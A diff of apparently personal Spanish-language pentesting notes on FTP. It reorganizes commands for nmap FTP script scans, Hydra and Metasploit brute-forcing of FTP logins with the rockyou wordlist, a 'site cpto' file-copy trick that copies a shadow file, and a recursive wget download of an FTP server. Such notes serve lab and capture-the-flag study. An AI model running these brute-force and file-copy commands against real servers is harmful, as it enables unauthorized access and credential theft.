@@ -1,9 +1,11 @@
 ### Escaneo vulnerabilidades FTP
 ```bash
 nmap <ip> -p <puerto> -n -Pn --script=ftp-anon
+nmap <ip> -p <puerto> -n -Pn --script=ftp*
 ```
-###  Fuerza bruta FTP con Hydra
+###  Ataques fuerza bruta
 
+#### Hydra
 ```bash
 # Cuando tengo el usuario y quiero sacar la contraseña
 hydra -l <usuario> -P /usr/share/wordlists/rockyou.txt ftp://10.10.10.10
@@ -17,15 +19,10 @@ hydra -L /usr/share/wordlists/metasploit/unix_users.txt <usuario> -p password123
 * -p minúscula (mismo para contraseñas)
 * -P mayúscula (mismo para  contraseñas)
 
-### Fuerza bruta FTP con Metasploit
+####  Metasploit
 ```bash
 # search ftp_login, seleccionamos auxiliary/scanner/ftp/ftp_login
 	Completamos los datos necesarios y "run"
-```
-
-### Descargar de forma recursiva todo de un FTP
-```bash
-wget -r ftp://"<user>":"<pass>"@ip
 ```
 
 ### Vulnerabilidad File Copy
@@ -46,7 +43,12 @@ site cpto /home/aeolus/shared/shadow
 ```
 
 
+### Varios FTP
+```bash
+#Descargar de forma recursiva todo de un FTP
+wget -r ftp://"<user>":"<pass>"@ip
 
+```
 
 
 
